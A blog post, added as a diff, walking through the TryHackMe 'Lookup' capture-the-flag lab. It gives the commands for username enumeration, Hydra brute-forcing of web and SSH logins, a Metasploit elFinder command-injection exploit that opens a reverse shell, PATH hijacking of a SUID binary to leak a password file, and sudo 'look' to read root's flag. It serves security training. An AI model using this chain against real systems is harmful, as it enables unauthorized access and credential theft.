@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Lookup — From Username Enumeration to Root — AryterLog</title>
+
+  <!-- PWA -->
+  <link rel="manifest" href="../../manifest.json">
+  <meta name="theme-color" content="#080b10">
+  <link rel="icon" href="../../icons/favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../../icons/apple-touch-icon.png">
+  <meta name="description" content="A complete TryHackMe Lookup walkthrough covering Nmap enumeration, username enumeration, Hydra password attacks, elFinder command injection, SUID PATH hijacking through pwm, SSH access as think, and privilege escalation through sudo look.">
+  <link rel="canonical" href="https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-lookup-writeup/">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="TryHackMe Lookup — From Username Enumeration to Root">
+  <meta property="og:description" content="A complete TryHackMe Lookup walkthrough covering Nmap enumeration, username enumeration, Hydra password attacks, elFinder command injection, SUID PATH hijacking through pwm, SSH access as think, and privilege escalation through sudo look.">
+  <meta property="og:url" content="https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-lookup-writeup/">
+  <meta property="og:site_name" content="AryterLog">
+  <meta property="article:published_time" content="2026-03-09T00:00:00.000Z">
+  <meta property="article:tag" content="ctf">
+  <meta property="article:tag" content="pentesting">
+  <meta property="article:tag" content="web-security">
+  <meta property="article:tag" content="post-exploitation">
+  <meta property="article:tag" content="privilege-escalation">
+  <meta property="article:tag" content="linux">
+  <meta property="article:tag" content="attack-techniques">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Lookup — From Username Enumeration to Root">
+  <meta name="twitter:description" content="A complete TryHackMe Lookup walkthrough covering Nmap enumeration, username enumeration, Hydra password attacks, elFinder command injection, SUID PATH hijacking through pwm, SSH access as think, and privilege escalation through sudo look.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe Lookup — From Username Enumeration to Root","description":"A complete TryHackMe Lookup walkthrough covering Nmap enumeration, username enumeration, Hydra password attacks, elFinder command injection, SUID PATH hijacking through pwm, SSH access as think, and privilege escalation through sudo look.","datePublished":"2026-03-09T00:00:00.000Z","author":{"@type":"Person","name":"Aryan Giri"},"publisher":{"@type":"Organization","name":"AryterLog"},"mainEntityOfPage":"https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-lookup-writeup/","keywords":"ctf, pentesting, web-security, post-exploitation, privilege-escalation, linux, attack-techniques"}</script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&family=Bebas+Neue&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#080b10; --surface:#0d1117; --surface2:#111820; --surface3:#161d27;
+      --text:#d0dbe8; --text2:#7a8a9a; --accent:#00ff88; --accent2:#0ea5e9;
+      --danger:#ff4560; --border:#1e2a38; --border2:#2a3848; --code-bg:#0a0f16;
+      --glow:rgba(0,255,136,0.08); --glow2:rgba(0,255,136,0.18);
+    }
+    .light {
+      --bg:#f5f7fa; --surface:#ffffff; --surface2:#f0f4f8; --surface3:#e8eef5;
+      --text:#111827; --text2:#6b7280; --accent:#059669; --accent2:#0284c7;
+      --danger:#dc2626; --border:#e2e8f0; --border2:#cbd5e1; --code-bg:#f1f5f9;
+      --glow:rgba(5,150,105,0.07); --glow2:rgba(5,150,105,0.14);
+    }
+    .eye-saver {
+      --bg:#12100a; --surface:#1a1608; --surface2:#211c0c; --surface3:#282210;
+      --text:#e8d8b0; --text2:#9a8860; --accent:#f5c542; --accent2:#e08030;
+      --danger:#e05050; --border:#302810; --border2:#3d3418; --code-bg:#0f0d06;
+      --glow:rgba(245,197,66,0.08); --glow2:rgba(245,197,66,0.18);
+    }
+
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body {
+      font-family:'Fira Code',monospace;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+      transition:background 0.4s,color 0.4s;
+    }
+    body::before {
+      content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+      background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+      background-size:44px 44px; opacity:0.25;
+    }
+
+    header {
+      position:sticky; top:0; z-index:200;
+      background:rgba(8,11,16,0.86); backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+      display:flex; align-items:center; justify-content:space-between;
+      padding:0 22px; height:56px; gap:12px;
+    }
+    .light header{background:rgba(245,247,250,0.9);}
+    .eye-saver header{background:rgba(18,16,10,0.9);}
+    header::after {
+      content:''; position:absolute; bottom:-1px; left:8%; right:8%; height:1px;
+      background:linear-gradient(90deg,transparent,var(--accent),transparent); opacity:0.35;
+    }
+    .header-left{display:flex;align-items:center;gap:12px;flex-shrink:0;}
+
+    .logo {
+      font-family:'Bebas Neue',sans-serif; font-size:24px; font-weight:400;
+      letter-spacing:3px; color:var(--text); text-decoration:none; white-space:nowrap;
+      flex-shrink:0; line-height:1; transition:color 0.2s;
+    }
+    .logo .lo-a{color:var(--accent);}
+    .logo:hover .lo-a{text-shadow:0 0 14px var(--accent);}
+
+    .back-link {
+      display:inline-flex; align-items:center; gap:6px;
+      background:transparent; border:1px solid var(--border2); color:var(--text2);
+      padding:6px 12px; border-radius:6px; cursor:pointer; transition:all 0.2s;
+      font-family:'Fira Code',monospace; font-size:11px; text-decoration:none;
+    }
+    .back-link:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    #theme-btn {
+      background:transparent; border:1px solid var(--border2);
+      padding:5px 11px; cursor:pointer; color:var(--text2); border-radius:6px;
+      transition:all 0.2s; font-family:'Fira Code',monospace; font-size:11px;
+      display:inline-flex; align-items:center; gap:6px; white-space:nowrap;
+    }
+    #theme-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    @keyframes popSpin{0%{transform:scale(0.4) rotate(-60deg);opacity:0;}70%{transform:scale(1.15) rotate(5deg);}100%{transform:scale(1) rotate(0deg);opacity:1;}}
+    .emoji{display:inline-block;}
+
+    main{max-width:760px;margin:0 auto;padding:34px 20px 60px;position:relative;z-index:1;}
+
+    .back-btn {
+      display:inline-flex;align-items:center;gap:7px;margin-bottom:20px;
+      background:var(--surface);border:1px solid var(--border2);color:var(--text2);
+      padding:7px 13px;border-radius:6px;font-family:'Fira Code',monospace;font-size:11px;
+      cursor:pointer;transition:all 0.2s;text-decoration:none;
+    }
+    .back-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    .post-content {
+      background:var(--surface);border:1px solid var(--border);border-radius:12px;
+      padding:34px 30px;position:relative;overflow:hidden;
+    }
+    .post-content::before {
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      border-radius:12px 12px 0 0;
+    }
+    .post-content *{max-width:100%;}
+
+    h1 {
+      font-family:'Space Grotesk',sans-serif;font-size:clamp(19px,4vw,26px);
+      font-weight:700;color:var(--text);margin-bottom:8px;line-height:1.25;word-break:break-word;
+    }
+    .post-header-meta{
+      font-family:'Fira Code',monospace;font-size:11px;color:var(--text2);
+      padding-bottom:18px;margin-bottom:22px;border-bottom:1px solid var(--border);
+      display:flex;gap:8px;flex-wrap:wrap;align-items:center;
+    }
+    .card-cat-chip {
+      display:inline-flex;align-items:center;padding:1px 7px;border-radius:3px;
+      border:1px solid var(--border2);background:var(--surface2);color:var(--text2);
+      font-size:9px;font-family:'Fira Code',monospace;font-weight:500;letter-spacing:0.4px;
+    }
+    h2,h3{font-family:'Space Grotesk',sans-serif;font-weight:600;color:var(--text);margin:26px 0 10px;word-break:break-word;}
+    h2{font-size:19px;} h3{font-size:15px;color:var(--accent);}
+    p{font-size:14px;line-height:1.8;margin-bottom:14px;color:var(--text);}
+    ul,ol{padding-left:20px;margin-bottom:14px;font-size:14px;line-height:1.8;}
+    li{margin-bottom:4px;}
+
+    a{color:var(--accent);word-break:break-all;overflow-wrap:break-word;transition:opacity 0.2s;}
+    a:hover{opacity:0.75;}
+    .post-content a{text-decoration:underline;text-underline-offset:3px;}
+
+    code {
+      background:var(--code-bg);border:1px solid var(--border);padding:2px 6px;
+      border-radius:4px;font-family:'Fira Code',monospace;font-size:0.85em;
+      color:var(--accent);word-break:break-all;overflow-wrap:break-word;
+    }
+    pre {
+      background:var(--code-bg);border:1px solid var(--border);padding:18px;border-radius:8px;
+      max-width:100%; overflow:hidden;
+      position:relative;margin-bottom:14px;
+    }
+    pre::before{
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      opacity:0.5;border-radius:8px 8px 0 0;
+    }
+    pre code{
+      background:transparent;border:none;padding:0 60px 0 0;word-break:normal;
+      overflow-wrap:normal;white-space:pre;display:block;
+      overflow-x:auto;-webkit-overflow-scrolling:touch;
+      font-size:13px;line-height:1.65;color:var(--text);
+    }
+    blockquote{
+      border-left:2px solid var(--accent);margin:14px 0;padding:10px 16px;
+      background:var(--glow);border-radius:0 6px 6px 0;font-style:italic;color:var(--text2);
+    }
+    table{width:100%;border-collapse:collapse;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;font-size:13px;margin-bottom:14px;}
+    th,td{border:1px solid var(--border);padding:8px 12px;text-align:left;white-space:nowrap;}
+    th{background:var(--surface2);color:var(--accent);font-weight:600;}
+    img{max-width:100%;height:auto;border-radius:8px;display:block;margin:14px 0;}
+
+    .copy-btn {
+      position:absolute;top:9px;right:9px;padding:3px 8px;font-size:10px;
+      font-family:'Fira Code',monospace;font-weight:500;background:var(--surface2);
+      border:1px solid var(--border2);color:var(--text2);border-radius:4px;cursor:pointer;
+      transition:all 0.2s;opacity:0;letter-spacing:0.3px;
+    }
+    pre:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    .copy-btn.copied{border-color:var(--accent);color:var(--accent);opacity:1;}
+
+    footer{
+      text-align:center;padding:22px 16px;color:var(--text2);
+      font-family:'Fira Code',monospace;font-size:11px;
+      border-top:1px solid var(--border);position:relative;z-index:1;
+    }
+    .f-accent{color:var(--accent);}
+    footer a{color:var(--accent);text-decoration:none;}
+    footer a:hover{opacity:0.75;}
+
+    @media(max-width:480px){
+      header{padding:0 13px;height:50px;}
+      .logo{font-size:21px;letter-spacing:2px;}
+      main{padding:20px 14px 44px;}
+      .post-content{padding:20px 14px;}
+      pre{padding:13px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-left">
+      <a href="../../index.html" class="logo">Aryter<span class="lo-a">Log</span></a>
+    </div>
+    <button id="theme-btn" aria-label="Cycle Theme">
+      <span class="emoji" id="theme-emoji">🌙</span>
+      <span id="theme-label">Dark</span>
+    </button>
+  </header>
+
+  <main>
+    <a href="../../index.html#post-tryhackme-lookup-writeup" class="back-btn">← Back to Blog</a>
+    <article class="post-content">
+      <h1>TryHackMe Lookup — From Username Enumeration to Root</h1>
+      <div class="post-header-meta">
+        <span>📅 Published 03-09-2026</span>
+        <span>·</span><span class="card-cat-chip">ctf</span><span class="card-cat-chip">pentesting</span><span class="card-cat-chip">web-security</span><span class="card-cat-chip">post-exploitation</span><span class="card-cat-chip">privilege-escalation</span><span class="card-cat-chip">linux</span><span class="card-cat-chip">attack-techniques</span>
+      </div>
+      <p>Written By Aryan Giri</p>
+<h1>TryHackMe Lookup — From Username Enumeration to Root</h1>
+<p>The TryHackMe <strong>Lookup</strong> room is a Linux-based penetration-testing lab focused on web enumeration, username enumeration, password attacks, command injection, SUID-based privilege escalation, PATH hijacking, and abusing a misconfigured <code>sudo</code> permission.</p>
+<p>The complete attack chain used in this write-up is:</p>
+<pre><code class="language-text">HTTP
+  │
+  ├── Username enumeration
+  │       │
+  │       └── Password brute force
+  │               │
+  │               └── Authenticated access
+  │                       │
+  │                       └── elFinder
+  │                               │
+  │                               └── Command Injection
+  │                                       │
+  │                                       └── www-data shell
+  │                                               │
+  │                                               └── SUID pwm
+  │                                                       │
+  │                                                       └── PATH Hijacking
+  │                                                               │
+  │                                                               └── .passwords
+  │                                                                       │
+  │                                                                       └── SSH as think
+  │                                                                               │
+  │                                                                               └── sudo look
+  │                                                                                       │
+  │                                                                                       └── Root flag
+</code></pre>
+<h2>Reconnaissance</h2>
+<p>I started with a basic service-version scan against the target.</p>
+<pre><code class="language-bash">nmap -sV &lt;IP&gt;
+</code></pre>
+<img width="630" height="227" alt="Screenshot 2026-08-30 172554" src="https://github.com/user-attachments/assets/86e70212-ad04-44ce-accc-2b2cfc4dc2e6" />
+
+
+<p>The scan revealed two interesting open ports:</p>
+<pre><code class="language-text">22/tcp  open  ssh
+80/tcp  open  http
+</code></pre>
+<p>Port 22 exposes SSH, while port 80 hosts the web application.</p>
+<h2>Web Enumeration</h2>
+<p>When visiting the target directly through its IP address, the web server redirects to:</p>
+<pre><code class="language-text">http://lookup.thm
+</code></pre>
+<p>This indicates that the application expects the <code>lookup.thm</code> hostname.</p>
+<p>I added the hostname to <code>/etc/hosts</code>:</p>
+<pre><code class="language-bash">sudo nano /etc/hosts
+</code></pre>
+<p>Then added:</p>
+<pre><code class="language-text">&lt;IP&gt; lookup.thm
+</code></pre>
+<p>Alternatively:</p>
+<pre><code class="language-bash">echo &quot;&lt;IP&gt; lookup.thm&quot; | sudo tee -a /etc/hosts
+</code></pre>
+<p>I could then access:</p>
+<pre><code class="language-text">http://lookup.thm
+</code></pre>
+<p>The site presented a login form.</p>
+<img width="895" height="719" alt="Screenshot 2026-08-30 172920" src="https://github.com/user-attachments/assets/3e580d91-10b1-4b9f-9d11-6f6c11204ef0" />
+
+
+<h2>Username Enumeration</h2>
+<p>Instead of immediately launching a password attack, I first tested the application&#39;s response to invalid credentials.</p>
+<p>For example, I submitted fictional credentials:</p>
+<pre><code class="language-text">Username: test
+Password: test
+</code></pre>
+<img width="854" height="498" alt="Screenshot 2026-08-30 172937" src="https://github.com/user-attachments/assets/a6307b42-9b5a-4d03-ae62-3f58eaac06e9" />
+
+
+<p>The application responded with:</p>
+<pre><code class="language-text">Wrong username or password. Please try again.
+</code></pre>
+<p>This becomes interesting when testing different usernames.</p>
+<p>A common web-enumeration weakness occurs when an application gives a different response depending on whether the supplied username exists. If the username is valid but the password is incorrect, the response may differ from the response for a completely invalid username.</p>
+<p>To understand the request properly, I intercepted the login request with Burp Suite.</p>
+<img width="744" height="477" alt="Screenshot 2026-08-30 173057" src="https://github.com/user-attachments/assets/51816815-161d-41d3-8377-ca84c040d2d3" />
+
+
+<p>The request contained two parameters:</p>
+<pre><code class="language-text">username
+password
+</code></pre>
+<p>The request structure was effectively:</p>
+<pre><code class="language-text">POST /login.php
+username=&lt;username&gt;&amp;password=&lt;password&gt;
+</code></pre>
+<p>This gave us everything required to automate username enumeration.</p>
+<h2>Brute-Forcing Valid Usernames</h2>
+<p>I used Hydra to test usernames while keeping the password fixed to a dummy value.</p>
+<pre><code class="language-bash">hydra -L /usr/share/seclists/Usernames/Names/names.txt \
+-p test \
+lookup.thm \
+http-post-form \
+&quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong username or password. Please try again.&quot;
+</code></pre>
+<p>Here:</p>
+<ul>
+<li><code>-L</code> supplies the username wordlist.</li>
+<li><code>-p test</code> uses a fixed password.</li>
+<li><code>http-post-form</code> tells Hydra to attack an HTTP POST form.</li>
+<li><code>^USER^</code> is replaced with each username.</li>
+<li><code>^PASS^</code> is replaced with the supplied password.</li>
+<li>The final string is the failure condition.</li>
+</ul>
+<img width="627" height="328" alt="Screenshot 2026-08-30 182837" src="https://github.com/user-attachments/assets/b26e1e05-5af1-481e-92cb-9dd8e9de3e70" />
+
+
+<p>The results identified usernames including:</p>
+<pre><code class="language-text">admin
+jose
+</code></pre>
+<p>The password <code>test</code> was not actually valid. These were useful because the application&#39;s responses allowed us to distinguish valid usernames from invalid ones.</p>
+<h2>Brute-Forcing the Admin Password</h2>
+<p>I first attempted to brute-force the <code>admin</code> account using <code>rockyou.txt</code>:</p>
+<pre><code class="language-bash">hydra -l admin \
+-P /usr/share/wordlists/rockyou.txt \
+lookup.thm \
+http-post-form \
+&quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong username or password. Please try again.&quot;
+</code></pre>
+<img width="630" height="306" alt="Screenshot 2026-08-30 183258" src="https://github.com/user-attachments/assets/39e82e62-4891-44d6-92fa-b7ca09fc90bb" />
+
+
+<p>Hydra reported a password, but manually testing it showed that it was a false positive.</p>
+<p>This is an important lesson when using automated password attacks: a tool&#39;s output is only as reliable as the failure condition supplied to it. If the application has unusual responses, redirects, or other behavior, Hydra can misinterpret a response as a successful login.</p>
+<h2>Brute-Forcing the <code>jose</code> Account</h2>
+<p>I then repeated the attack against <code>jose</code>:</p>
+<pre><code class="language-bash">hydra -l jose \
+-P /usr/share/wordlists/rockyou.txt \
+lookup.thm \
+http-post-form \
+&quot;/login.php:username=^USER^&amp;password=^PASS^:Wrong username or password. Please try again.&quot;
+</code></pre>
+<img width="637" height="314" alt="Screenshot 2026-08-30 183244" src="https://github.com/user-attachments/assets/20c99fbc-1117-490c-a200-98247f2b92ed" />
+
+
+<p>This time, the discovered password worked.</p>
+<p>Interestingly, the password was also associated with the earlier <code>admin</code> result, but it did not authenticate successfully as <code>admin</code>. This demonstrates why credentials reported by brute-force tools should always be manually verified.</p>
+<p>After authenticating as <code>jose</code>, the application redirected me to another virtual host:</p>
+<pre><code class="language-text">files.lookup.thm
+</code></pre>
+<img width="284" height="50" alt="Screenshot 2026-08-30 183506" src="https://github.com/user-attachments/assets/5bced1a1-4887-48f1-99e7-24aca6a6e5a9" />
+
+<h2>Enumerating <code>files.lookup.thm</code></h2>
+<p>I added the new virtual host to <code>/etc/hosts</code>:</p>
+<pre><code class="language-text">&lt;IP&gt; lookup.thm files.lookup.thm
+</code></pre>
+<p>The authenticated page exposed <strong>elFinder</strong>, a web-based file manager.</p>
+<img width="1498" height="808" alt="Screenshot 2026-08-30 190506" src="https://github.com/user-attachments/assets/7b7e2a42-7bd6-444f-803f-961f903509ea" />
+
+
+<p>If the page does not render correctly while using Burp Suite, disable the HTTP proxy temporarily and access the application directly.</p>
+<p>elFinder provides functionality for browsing and managing files through a web interface.</p>
+<p>I then looked for version information by using the application&#39;s information/help interface.</p>
+<img width="689" height="550" alt="Screenshot 2026-08-30 190948" src="https://github.com/user-attachments/assets/be41589a-a1dd-4e0e-918c-28f2605f6432" />
+
+
+<p>The installed version was:</p>
+<pre><code class="language-text">elFinder 2.1.47
+</code></pre>
+<p>This version was interesting because public exploit information exists for an <strong>Exiftran command injection</strong> affecting the PHP connector.</p>
+<h2>Exploiting elFinder</h2>
+<p>I checked the available Metasploit modules:</p>
+<pre><code class="language-bash">msfconsole
+</code></pre>
+<p>Then:</p>
+<pre><code class="language-text">search elFinder
+</code></pre>
+<p>One of the relevant modules was:</p>
+<pre><code class="language-text">exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
+</code></pre>
+<p>I inspected the module:</p>
+<pre><code class="language-text">info exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
+</code></pre>
+<p>Then selected it:</p>
+<pre><code class="language-text">use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
+</code></pre>
+<img width="624" height="125" alt="Screenshot 2026-08-30 202317" src="https://github.com/user-attachments/assets/9a20b452-de11-4cb8-badc-12fd47e2df59" />
+
+
+<p>I configured the required options:</p>
+<pre><code class="language-text">set LHOST &lt;YOUR_IP&gt;
+set RHOSTS upload.lookup.thm
+</code></pre>
+<p>The module&#39;s default listener port was <code>4444</code>.</p>
+<p>To inspect all available options:</p>
+<pre><code class="language-text">show options
+</code></pre>
+<p>I then launched the exploit:</p>
+<pre><code class="language-text">run
+</code></pre>
+<p>or:</p>
+<pre><code class="language-text">exploit
+</code></pre>
+<img width="625" height="397" alt="Screenshot 2026-08-30 202555" src="https://github.com/user-attachments/assets/06d823f7-0f4c-4df5-871b-a0b8112897d8" />
+
+
+<p>The exploit provided a shell on the target.</p>
+<h2>Getting a More Usable Shell</h2>
+<p>The initial shell was very limited, so I upgraded it to a more interactive Bash shell using Python:</p>
+<pre><code class="language-bash">python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<img width="582" height="68" alt="Screenshot 2026-09-03 120029" src="https://github.com/user-attachments/assets/5af18ea8-3ea5-45fc-94d3-a3e9a0e306ed" />
+
+
+<p>At this point, I had command execution as:</p>
+<pre><code class="language-text">www-data
+</code></pre>
+<h2>Post-Exploitation Enumeration</h2>
+<p>I started looking around the filesystem.</p>
+<pre><code class="language-bash">cd /home
+ls
+</code></pre>
+<p>A user named <code>think</code> was present.</p>
+<p>I inspected the directory:</p>
+<pre><code class="language-bash">ls -la /home/think
+</code></pre>
+<p>Among the files was:</p>
+<pre><code class="language-text">user.txt
+</code></pre>
+<p>However, as <code>www-data</code>, I did not have permission to read the flag.</p>
+<p>There was also an interesting hidden file:</p>
+<pre><code class="language-text">.passwords
+</code></pre>
+<p>This looked potentially useful, but it was not readable directly by <code>www-data</code>.</p>
+<p>Instead of stopping there, I started looking for privilege-escalation opportunities.</p>
+<h2>Finding SUID Binaries</h2>
+<p>I searched the filesystem for SUID binaries:</p>
+<pre><code class="language-bash">find / -perm -4000 -type f 2&gt;/dev/null
+</code></pre>
+<p>There were several standard SUID binaries, but one unusual binary stood out:</p>
+<pre><code class="language-text">/usr/sbin/pwm
+</code></pre>
+<p>Running it produced an interesting message indicating that it attempted to execute <code>id</code> and then look for a <code>.passwords</code> file belonging to the detected user.</p>
+<p>The important observation was that the binary was not simply reading <code>/home/think/.passwords</code> directly.</p>
+<p>I needed to understand what it was actually doing.</p>
+<h2>Investigating <code>pwm</code> with <code>strace</code></h2>
+<p>The compromised machine already had <code>strace</code>, so I used it to trace process execution:</p>
+<pre><code class="language-bash">strace -f -e execve /usr/sbin/pwm 2&gt;&amp;1
+</code></pre>
+<img width="812" height="404" alt="Screenshot 2026-09-03 122340" src="https://github.com/user-attachments/assets/d96b4d18-ed2c-4146-a803-1592fb1a7286" />
+
+
+<p>The trace revealed execution similar to:</p>
+<pre><code class="language-text">execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;id&quot;], ...)
+execve(&quot;/usr/bin/id&quot;, [&quot;id&quot;], ...)
+</code></pre>
+<p>The important part was that <code>pwm</code> was invoking <code>id</code> through the shell rather than relying on a hard-coded path inside the original command.</p>
+<p>This suggested a potential <strong>PATH hijacking</strong> opportunity.</p>
+<p>If we can control the <code>PATH</code> used by the SUID program, we can potentially make it execute our own <code>id</code> program.</p>
+<h2>PATH Hijacking</h2>
+<p>I moved to <code>/tmp</code>, where I could create files:</p>
+<pre><code class="language-bash">cd /tmp
+</code></pre>
+<p>Because the environment was limited and <code>nano</code> was unavailable, I created a fake <code>id</code> command directly with <code>cat</code>:</p>
+<pre><code class="language-bash">cat &gt; id &lt;&lt;&#39;EOF&#39;
+#!/bin/bash
+echo &quot;uid=33(think) gid=33(www-data) groups=33(www-data)&quot;
+EOF
+</code></pre>
+<p>Then made it executable:</p>
+<pre><code class="language-bash">chmod +x id
+</code></pre>
+<p>The goal was to make <code>pwm</code> believe that the current user was <code>think</code>.</p>
+<p>I prepended <code>/tmp</code> to the <code>PATH</code>:</p>
+<pre><code class="language-bash">export PATH=/tmp:$PATH
+</code></pre>
+<img width="662" height="354" alt="Screenshot 2026-09-03 122615" src="https://github.com/user-attachments/assets/c1e140dd-2941-45f9-b2e7-c68831025473" />
+
+
+<p>I verified the modified value:</p>
+<pre><code class="language-bash">echo $PATH
+</code></pre>
+<p>Now when <code>pwm</code> attempted to execute:</p>
+<pre><code class="language-text">id
+</code></pre>
+<p>the shell would search <code>/tmp</code> first and find our fake executable.</p>
+<p>I ran:</p>
+<pre><code class="language-bash">/usr/sbin/pwm
+</code></pre>
+<p>This caused <code>pwm</code> to believe that the current user was <code>think</code> and resulted in the contents of:</p>
+<pre><code class="language-text">/home/think/.passwords
+</code></pre>
+<p>being disclosed.</p>
+<img width="795" height="414" alt="Screenshot 2026-09-03 122817" src="https://github.com/user-attachments/assets/0f37a69d-57bb-4d30-83e0-a53c5d893b2d" />
+
+
+<p>This was the key transition from the <code>www-data</code> shell to obtaining credentials for the <code>think</code> account.</p>
+<h2>SSH Password Attack Against <code>think</code></h2>
+<p>I copied the recovered password list to my attacker machine and saved it as:</p>
+<pre><code class="language-text">think.txt
+</code></pre>
+<p>I then used Hydra against SSH:</p>
+<pre><code class="language-bash">hydra -l think -P think.txt ssh://lookup.thm
+</code></pre>
+<img width="821" height="373" alt="Screenshot 2026-09-03 123353" src="https://github.com/user-attachments/assets/b463b602-1dd2-4631-af05-0f6f70c9affd" />
+
+
+<p>Hydra identified the valid password for the <code>think</code> account.</p>
+<p>I then connected through SSH:</p>
+<pre><code class="language-bash">ssh think@lookup.thm
+</code></pre>
+<p>After entering the recovered password, I obtained an interactive SSH session as <code>think</code>.</p>
+<img width="820" height="537" alt="Screenshot 2026-09-03 175033" src="https://github.com/user-attachments/assets/8d292709-ddcd-43b1-b8a5-320208cfab13" />
+
+
+<h2>User Flag</h2>
+<p>I checked the user&#39;s home directory:</p>
+<pre><code class="language-bash">cd /home/think
+ls
+</code></pre>
+<p>Then read the user flag:</p>
+<pre><code class="language-bash">cat user.txt
+</code></pre>
+<img width="738" height="140" alt="Screenshot 2026-09-03 175058" src="https://github.com/user-attachments/assets/fa480d18-0189-4e2d-82dc-072aafaca0ea" />
+
+
+<p>The flag is intentionally omitted from this write-up.</p>
+<p>At this point, the user-level portion of the machine was complete.</p>
+<h2>Privilege Escalation: <code>sudo -l</code></h2>
+<p>Next, I checked which commands the <code>think</code> user could execute with elevated privileges:</p>
+<pre><code class="language-bash">sudo -l
+</code></pre>
+<p>After entering the <code>think</code> user&#39;s password, the output showed that <code>think</code> could execute:</p>
+<pre><code class="language-text">/usr/bin/look
+</code></pre>
+<p>with <code>sudo</code>.</p>
+<img width="814" height="236" alt="Screenshot 2026-09-03 175207" src="https://github.com/user-attachments/assets/bf909f8c-702d-415f-b5a5-55102dec3265" />
+
+
+<p><code>look</code> was unfamiliar to me as a privilege-escalation primitive, so I checked its known GTFOBins technique.</p>
+<p>The important behavior is that <code>look</code> can be supplied with an empty search string and a file as its dictionary argument, allowing it to output the contents of that file.</p>
+<p>The relevant syntax is:</p>
+<pre><code class="language-bash">look &#39;&#39; /path/to/input-file
+</code></pre>
+<h2>Reading the Root Flag with <code>look</code></h2>
+<p>Because <code>think</code> could execute <code>look</code> as root, I used:</p>
+<pre><code class="language-bash">sudo look &#39;&#39; /root/root.txt
+</code></pre>
+<img width="583" height="220" alt="Screenshot 2026-09-03 175757" src="https://github.com/user-attachments/assets/edc96d5a-3b29-4c50-b44f-d0f7bc9290ce" />
+
+
+<p>This allowed the root-owned flag to be read without needing a conventional root shell.</p>
+<p>The root flag is intentionally omitted from this write-up.</p>
+<h2>Attack Chain</h2>
+<p>The complete exploitation path was:</p>
+<pre><code class="language-text">Port 80
+    │
+    └── lookup.thm
+          │
+          └── Login form
+                │
+                └── Username enumeration
+                      │
+                      └── Valid users: admin / jose
+                            │
+                            └── Password brute force
+                                  │
+                                  └── jose credentials
+                                        │
+                                        └── files.lookup.thm
+                                              │
+                                              └── elFinder 2.1.47
+                                                    │
+                                                    └── Exiftran command injection
+                                                          │
+                                                          └── www-data
+                                                                │
+                                                                └── SUID /usr/sbin/pwm
+                                                                      │
+                                                                      └── strace analysis
+                                                                            │
+                                                                            └── PATH hijacking
+                                                                                  │
+                                                                                  └── /home/think/.passwords
+                                                                                        │
+                                                                                        └── SSH brute force
+                                                                                              │
+                                                                                              └── think
+                                                                                                    │
+                                                                                                    └── sudo -l
+                                                                                                          │
+                                                                                                          └── /usr/bin/look
+                                                                                                                │
+                                                                                                                └── /root/root.txt
+</code></pre>
+<p>The room demonstrates how several individually small weaknesses can be chained together into full compromise: information leakage during authentication, weak credentials, a vulnerable file-management component, command injection, an unsafe SUID binary, PATH hijacking, credential reuse, and finally an overly permissive <code>sudo</code> rule.</p>
+<p>The official TryHackMe room describes Lookup as a machine covering reconnaissance, hidden services and subdomains, command injection, automation, and privilege escalation.</p>
+
+    </article>
+  </main>
+
+  <footer>
+    <span class="f-accent">$</span> echo "Made by <span class="f-accent">Aryan Giri</span>" &nbsp;·&nbsp; <a href="https://github.com/giriaryan694-a11y" target="_blank" rel="noopener noreferrer">GitHub</a>
+  </footer>
+
+  <script>
+    /* Theme — synced with main site via same cookie */
+    const themes=["dark","light","eye-saver"];
+    const themeData={"dark":{emoji:"🌙",label:"Dark"},"light":{emoji:"☀️",label:"Light"},"eye-saver":{emoji:"☕",label:"Reading"}};
+    function setCookie(n,v,d){const e=new Date();e.setTime(e.getTime()+d*86400000);document.cookie=`${n}=${v};expires=${e.toUTCString()};path=/`;}
+    function getCookie(n){const m=document.cookie.match(new RegExp('(^| )'+n+'=([^;]+)'));return m?m[2]:null;}
+    let currentTheme=getCookie("site_theme")||"dark";
+    const themeBtn=document.getElementById("theme-btn");
+    const themeEmoji=document.getElementById("theme-emoji");
+    function applyTheme(theme,animate=false){
+      document.body.className=theme==="dark"?"":theme;
+      themeEmoji.textContent=themeData[theme].emoji;
+      document.getElementById("theme-label").textContent=themeData[theme].label;
